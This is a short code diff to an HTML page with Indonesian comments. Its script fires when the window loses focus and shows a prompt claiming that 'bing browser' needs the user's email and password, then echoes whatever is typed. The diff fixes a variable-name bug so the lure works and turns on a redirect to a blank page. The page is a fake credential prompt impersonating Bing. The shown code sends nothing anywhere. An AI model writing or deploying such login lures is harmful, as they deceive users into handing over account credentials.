@@ -8,14 +8,14 @@
     <script>
         onblur = () => {
             // Menampilkan prompt dialog saja
-            const nama = prompt("in order to access bing browser you must first login on your account \n please type your email and your password:");
+            const login = prompt("in order to access bing browser you must first login on your account \n please type your email and your password:");
             if (login) {
                 alert(`email and password, ${login}!`);
             }
         }
         
         // Membuka halaman kosong di jendela yang sama
-        //window.open("about:blank", "_self");
+        window.open("about:blank", "_self");
     </script>
 </body>
 </html>
